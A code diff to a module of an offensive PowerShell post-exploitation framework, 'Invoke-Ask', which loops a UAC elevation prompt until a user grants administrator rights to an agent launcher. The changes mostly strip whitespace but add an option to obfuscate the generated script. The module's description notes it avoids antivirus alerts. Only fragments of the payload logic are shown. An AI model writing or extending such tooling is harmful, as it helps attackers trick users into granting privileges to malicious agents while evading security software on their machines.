@@ -4,12 +4,12 @@ class Module:
 
     def __init__(self, mainMenu, params=[]):
 
-        self.info = {   
+        self.info = {
             'Name': 'Invoke-Ask',
-                
+
             'Author': ['Jack64'],
-                                              
-            'Description': ("Leverages Start-Process' -Verb runAs option inside a"               
+
+            'Description': ("Leverages Start-Process' -Verb runAs option inside a"
                             " YES-Required loop to prompt the user for a high integrity context before running the agent code."
                             " UAC will report Powershell is requesting Administrator privileges."
                             " Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts."),
@@ -17,13 +17,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb'
             ]
@@ -57,9 +57,9 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            } 
+            }
         }
-        
+
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
@@ -71,7 +71,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
 
@@ -110,5 +110,9 @@ else  {
     "[!] User is not a local administrator!"
 }
 ''' %(encLauncher)
-
+                if obfuscate:
+                    script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
                 return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
